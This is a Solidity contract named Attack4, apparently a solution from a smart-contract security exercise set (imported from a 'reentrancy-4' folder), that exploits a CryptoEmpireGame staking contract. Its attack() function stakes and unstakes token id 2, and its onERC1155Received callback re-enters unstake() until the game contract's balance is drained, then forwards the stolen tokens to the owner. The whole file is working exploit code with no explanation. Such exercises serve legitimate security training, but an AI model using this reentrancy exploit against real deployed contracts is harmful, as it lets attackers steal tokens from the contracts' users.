// SPDX-License-Identifier: GPL-3.0-or-later 
pragma solidity ^0.8.13;

import "../reentrancy-4/CryptoEmpireGame.sol";
import {ERC1155} from "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";

contract Attack4 {

    CryptoEmpireGame public ceg;
    IERC1155 public cet;
    address public owner;

    constructor(address _ceg)payable {
        ceg = CryptoEmpireGame(_ceg);
        cet = IERC1155(ceg.cryptoEmpireToken());
        owner = msg.sender;

    }

    modifier onlyOwner(){
        require(owner == msg.sender, "Only owner!");
        _;
    } 

    function attack() public onlyOwner {

        cet.setApprovalForAll(address(ceg), true);
        
        ceg.stake(2);
        ceg.unstake(2);

    } 

    uint public numRec;
    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata 
    ) external returns (bytes4) {

        numRec++;

        if (numRec >= 2){
            require(msg.sender == address(cet), "Only token contract!" );
            if (cet.balanceOf(address(ceg), 2) > 0){
                ceg.unstake(2);
            }
            cet.safeTransferFrom(address(this), address(owner), 2, cet.balanceOf(address(this), 2), "0x");
        }
        return this.onERC1155Received.selector;
    }
    receive() external payable {}
}
